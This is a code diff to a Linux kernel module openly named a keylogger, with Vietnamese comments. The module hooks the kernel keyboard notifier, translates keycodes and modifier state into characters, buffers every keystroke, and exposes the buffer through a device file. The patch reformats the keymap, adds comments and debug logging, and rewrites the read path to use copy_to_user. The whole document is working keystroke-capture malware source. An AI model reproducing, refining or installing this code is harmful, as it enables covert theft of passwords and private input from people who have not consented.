@@ -34,6 +34,7 @@ static char pending_key[MAX_PENDING_CHARS];
 static int pending_count = 0;
 static struct file *log_file;
 
+// kiem soat trang thai phim (nhan hay khong nhan)
 static bool left_shift_pressed = false;
 static bool right_shift_pressed = false;
 static bool left_ctrl_pressed = false;
@@ -45,26 +46,62 @@ static bool caps_lock_active = false;
 struct key_map {
     int keycode;
     const char *special; // Chuỗi đặc biệt cho phím không có ký tự ASCII
-    char normal;
-    char shifted;
+    char normal;	// phim thuong khong shift
+    char shifted;	// phim khi giu shift
     char combo_char; // Ký tự dùng trong tổ hợp phím
 };
 
 static const struct key_map keymap[] = {
-    {KEY_1, NULL, '1', '!', '1'}, {KEY_2, NULL, '2', '@', '2'}, {KEY_3, NULL, '3', '#', '3'}, {KEY_4, NULL, '4', '$', '4'},
-    {KEY_5, NULL, '5', '%', '5'}, {KEY_6, NULL, '6', '^', '6'}, {KEY_7, NULL, '7', '&', '7'}, {KEY_8, NULL, '8', '*', '8'},
-    {KEY_9, NULL, '9', '(', '9'}, {KEY_0, NULL, '0', ')', '0'}, {KEY_MINUS, NULL, '-', '_', '-'}, {KEY_EQUAL, NULL, '=', '+', '='},
-    {KEY_TAB, "[TAB]", 0, 0, 0}, {KEY_Q, NULL, 'q', 'Q', 'Q'}, {KEY_W, NULL, 'w', 'W', 'W'}, {KEY_E, NULL, 'e', 'E', 'E'},
-    {KEY_R, NULL, 'r', 'R', 'R'}, {KEY_T, NULL, 't', 'T', 'T'}, {KEY_Y, NULL, 'y', 'Y', 'Y'}, {KEY_U, NULL, 'u', 'U', 'U'},
-    {KEY_I, NULL, 'i', 'I', 'I'}, {KEY_O, NULL, 'o', 'O', 'O'}, {KEY_P, NULL, 'p', 'P', 'P'}, {KEY_LEFTBRACE, NULL, '[', '{', '['},
-    {KEY_RIGHTBRACE, NULL, ']', '}', ']'}, {KEY_ENTER, NULL, '\n', '\n', '\n'}, {KEY_A, NULL, 'a', 'A', 'A'}, {KEY_S, NULL, 's', 'S', 'S'},
-    {KEY_D, NULL, 'd', 'D', 'D'}, {KEY_F, NULL, 'f', 'F', 'F'}, {KEY_G, NULL, 'g', 'G', 'G'}, {KEY_H, NULL, 'h', 'H', 'H'},
-    {KEY_J, NULL, 'j', 'J', 'J'}, {KEY_K, NULL, 'k', 'K', 'K'}, {KEY_L, NULL, 'l', 'L', 'L'}, {KEY_SEMICOLON, NULL, ';', ':', ';'},
-    {KEY_APOSTROPHE, NULL, '\'', '"', '\''}, {KEY_BACKSLASH, NULL, '\\', '|', '\\'}, {KEY_Z, NULL, 'z', 'Z', 'Z'},
-    {KEY_X, NULL, 'x', 'X', 'X'}, {KEY_C, NULL, 'c', 'C', 'C'}, {KEY_V, NULL, 'v', 'V', 'V'}, {KEY_B, NULL, 'b', 'B', 'B'},
-    {KEY_N, NULL, 'n', 'N', 'N'}, {KEY_M, NULL, 'm', 'M', 'M'}, {KEY_COMMA, NULL, ',', '<', ','}, {KEY_DOT, NULL, '.', '>', '.'},
-    {KEY_SLASH, NULL, '/', '?', '/'}, {KEY_SPACE, NULL, ' ', ' ', ' '},
-    // Phím điều khiển
+    {KEY_1,         NULL, '1', '!', '1'},
+    {KEY_2,         NULL, '2', '@', '2'},
+    {KEY_3,         NULL, '3', '#', '3'},
+    {KEY_4,         NULL, '4', '$', '4'},
+    {KEY_5,         NULL, '5', '%', '5'},
+    {KEY_6,         NULL, '6', '^', '6'},
+    {KEY_7,         NULL, '7', '&', '7'},
+    {KEY_8,         NULL, '8', '*', '8'},
+    {KEY_9,         NULL, '9', '(', '9'},
+    {KEY_0,         NULL, '0', ')', '0'},
+    {KEY_MINUS,     NULL, '-', '_', '-'},
+    {KEY_EQUAL,     NULL, '=', '+', '='},
+    {KEY_TAB,    "[TAB]",  0 ,  0 ,  0 },
+    {KEY_Q,         NULL, 'q', 'Q', 'Q'},
+    {KEY_W,         NULL, 'w', 'W', 'W'},
+    {KEY_E,         NULL, 'e', 'E', 'E'},
+    {KEY_R,         NULL, 'r', 'R', 'R'},
+    {KEY_T,         NULL, 't', 'T', 'T'},
+    {KEY_Y,         NULL, 'y', 'Y', 'Y'},
+    {KEY_U,         NULL, 'u', 'U', 'U'},
+    {KEY_I,         NULL, 'i', 'I', 'I'},
+    {KEY_O,         NULL, 'o', 'O', 'O'},
+    {KEY_P,         NULL, 'p', 'P', 'P'},
+    {KEY_LEFTBRACE, NULL, '[', '{', '['},
+    {KEY_RIGHTBRACE,NULL, ']', '}', ']'},
+    {KEY_ENTER,     NULL, '\n','\n','\n'},
+    {KEY_A,         NULL, 'a', 'A', 'A'},
+    {KEY_S,         NULL, 's', 'S', 'S'},
+    {KEY_D,         NULL, 'd', 'D', 'D'},
+    {KEY_F,         NULL, 'f', 'F', 'F'},
+    {KEY_G,         NULL, 'g', 'G', 'G'},
+    {KEY_H,         NULL, 'h', 'H', 'H'},
+    {KEY_J,         NULL, 'j', 'J', 'J'},
+    {KEY_K,         NULL, 'k', 'K', 'K'},
+    {KEY_L,         NULL, 'l', 'L', 'L'},
+    {KEY_SEMICOLON, NULL, ';', ':', ';'},
+    {KEY_APOSTROPHE,NULL, '\'', '"', '\''},
+    {KEY_BACKSLASH, NULL, '\\','|', '\\'},
+    {KEY_Z,         NULL, 'z', 'Z', 'Z'},
+    {KEY_X,         NULL, 'x', 'X', 'X'},
+    {KEY_C,         NULL, 'c', 'C', 'C'},
+    {KEY_V,         NULL, 'v', 'V', 'V'},
+    {KEY_B,         NULL, 'b', 'B', 'B'},
+    {KEY_N,         NULL, 'n', 'N', 'N'},
+    {KEY_M,         NULL, 'm', 'M', 'M'},
+    {KEY_COMMA,     NULL, ',', '<', ','},
+    {KEY_DOT,       NULL, '.', '>', '.'},
+    {KEY_SLASH,     NULL, '/', '?', '/'},
+    {KEY_SPACE,     NULL, ' ', ' ', ' '},
+// Phím điều khiển
     {KEY_BACKSPACE, "[BS]", 0, 0, 0}, // Backspace
     {KEY_DELETE, "[DEL]", 0, 0, 0},   // Delete
     {KEY_LEFTCTRL, "[CT]", 0, 0, 0},  // Left Ctrl
@@ -78,16 +115,21 @@ static const struct key_map keymap[] = {
     {0, NULL, 0, 0, 0} // Kết thúc bảng
 };
 
+// Ham chuyen doi keycode thanh chuoi, luu vao pending_key[]
 static void set_pending_key(int keycode) {
+// trang thai phim shift chung
     bool shift_pressed = left_shift_pressed || right_shift_pressed;
+// trang thai phim ctrl chung
     bool ctrl_pressed = left_ctrl_pressed || right_ctrl_pressed;
+// trang thai phim alt chung
     bool alt_pressed = left_alt_pressed || right_alt_pressed;
+// trang thai cac phim dieu chinh
     bool is_modifier = (keycode == KEY_LEFTSHIFT || keycode == KEY_RIGHTSHIFT ||
                        keycode == KEY_LEFTCTRL || keycode == KEY_RIGHTCTRL ||
                       keycode == KEY_LEFTALT || keycode == KEY_RIGHTALT ||
                        keycode == KEY_CAPSLOCK);
 
-    // Không xử lý nếu là phím điều chỉnh
+    // Không xử lý nếu là phím điều chỉnh vi chung ko tao ra ki tu rieng
     if (is_modifier) {
         pending_count = 0;
         return;
@@ -185,6 +227,7 @@ static void keylogger_work_func(struct work_struct *work) {
     pending_count = 0;
 }
 
+//callback duoc kernel goi khi co su kien ban phim
 static int keylogger_notifier(struct notifier_block *nb, unsigned long action, void *data) {
     struct keyboard_notifier_param *param = data;
 
@@ -239,27 +282,41 @@ static struct notifier_block nb = {
 static ssize_t keylogger_read(struct file *file, char __user *buf, size_t len, loff_t *off) {
     int copied = 0;
     unsigned long flags;
+    char temp_buf[BUF_SIZE];
 
-    if (wait_event_interruptible(keylogger_wq, tail != head))
+    if (len == 0) {
+        printk(KERN_DEBUG "keylogger_read: len is 0\n");
+        return 0;
+    }
+
+    if (wait_event_interruptible(keylogger_wq, tail != head)) {
+        printk(KERN_DEBUG "keylogger_read: wait interrupted\n");
         return -ERESTARTSYS;
+    }
 
     spin_lock_irqsave(&buf_lock, flags);
     while (tail != head && copied < len) {
-        if (put_user(keybuf[tail], buf + copied)) {
-            spin_unlock_irqrestore(&buf_lock, flags);
-            return -EFAULT;
-        }
+        temp_buf[copied] = keybuf[tail];
         tail = (tail + 1) % BUF_SIZE;
         copied++;
     }
     spin_unlock_irqrestore(&buf_lock, flags);
 
+    if (copied > 0) {
+        if (copy_to_user(buf, temp_buf, copied)) {
+            printk(KERN_ERR "keylogger_read: copy_to_user failed\n");
+            return -EFAULT;
+        }
+    }
+
+    printk(KERN_DEBUG "keylogger_read: copied %d bytes\n", copied);
     return copied;
 }
 
 static const struct file_operations fops = {
     .owner = THIS_MODULE,
     .read = keylogger_read,
+    .llseek = no_llseek,
 };
 
 static int __init keylogger_init(void) {
